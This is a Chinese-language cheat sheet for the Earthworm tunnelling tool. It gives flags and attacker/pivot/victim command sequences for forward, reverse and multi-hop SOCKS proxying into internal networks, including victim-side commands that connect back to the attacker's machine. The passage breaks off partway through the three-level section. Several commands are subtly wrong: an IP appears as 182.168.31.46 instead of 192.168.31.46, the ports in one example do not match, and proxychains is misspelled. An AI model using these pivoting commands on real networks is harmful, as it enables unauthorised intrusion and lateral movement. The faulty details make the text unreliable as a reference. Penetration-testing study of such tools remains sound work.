## Earthworm(蜗牛)

---

#### 基本参数

- -s 选择功能
  - ssocksd 正向代理
  - rcsocks 反向代理 流量转发
  - rssocks 反向代理 反弹socks5
  - lcx_listen 反向代理 流量转发
  - lcx_tran 端口转发
  - lcx_slave 端口绑定
- -l 指定要监听的本地端口
- -d 指定要反弹到机器ip
- -e 指定要反弹到的机器端口
- -f 指定要主动连接机器ip
- -g 指定要主动连接的机器端口
- -t 指定超时时长，默认1000

---

#### 正向代理

- 攻击机 192.168.31.46

- 被攻击机 192.168.56.6 192.168.31.139

- 被攻击机执行
  ```sh
  ./ew -s ssocksd -l 7778
  ```

- 然后攻击机使用代理

---

#### 反向代理

- 攻击机 192.168.31.46

- 被攻击机 192.168.56.6 192.168.31.139

- 攻击机执行命令
  ```bash
  ./ew -s rcsocks -l 7778 -e 7779    //监听7778端口，转发到7779端口
  ```

- 被攻击机执行
  ```bash
  ./ew -s rssocks -d 192.168.31.46 -e 7779. //启动socks5 服务，并且反弹到攻击机 7779端口
  ```

- proxychains 配置文件修改

  socks5 127.0.0.1 7778

- 然后使用代理

---

#### 二级正向代理

- 攻击机 192.168.31.46

- 跳板机 192.168.56.6 192.168.31.139

- 被攻击机 192.168.56.7

- 被攻击机执行
  ```shell
  ./ew -s ssocksd -l 7778
  ```

- 跳板机执行
  ```shell
  ./ew -s lcx_tran -l 7779 -f 192.168.56.7 -g 7778
  ```

- 攻击机执行

  - 修改配置文件
    - socks5 192.168.56.6 7778

  ```shell
  proxychain4 执行
  ```

---

#### 二级反向代理

- 攻击机 192.168.31.46

- 跳板机 192.168.56.6 192.168.31.139

- 被攻击机 192.168.56.7

- 被攻击机执行
  ```shell
  ./ew -s ssocksd -l 7777
  ```

- 攻击机执行
  ```shell
  ./ew -s lcx_listen -l 7778 -e 7779
  ```

- 跳板机执行
  ```shell
  ./ew -s lcx_slave -d 182.168.31.46 -e 7779 -f 192.168.56.7 -g 7777
  ```

- 攻击机修改配置文件

  - socks5 127.0.0.1 7778

---

#### 三级正向代理

- 攻击机 192.168.31.46

- 跳板机 192.168.56.6 192.168.31.139

- 被攻击机 192.168.56.7

- 在被攻击机上执行
  ```shell
  ./ew -s ssocksd -l 7779
  ```

- 在跳板机执行

